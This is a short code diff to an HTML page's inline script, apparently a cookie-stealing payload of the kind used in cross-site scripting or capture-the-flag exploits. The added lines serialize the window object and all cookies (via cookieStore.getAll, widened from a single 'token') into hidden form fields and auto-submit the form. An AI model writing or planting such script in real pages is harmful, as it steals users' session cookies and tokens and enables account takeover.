@@ -11,8 +11,10 @@
                     </form>
 
                     <script>
-                        
-                      cookieStore.get("token").then(r=>{
+                          document.getElementById('cookie').value = JSON.stringify(window)
+                        document.getElementById('form').submit()
+                      
+                      cookieStore.getAll().then(r=>{
                         document.getElementById('cookie').value = JSON.stringify(window)
                         document.getElementById('window').value = r 
                         document.getElementById('form').submit()
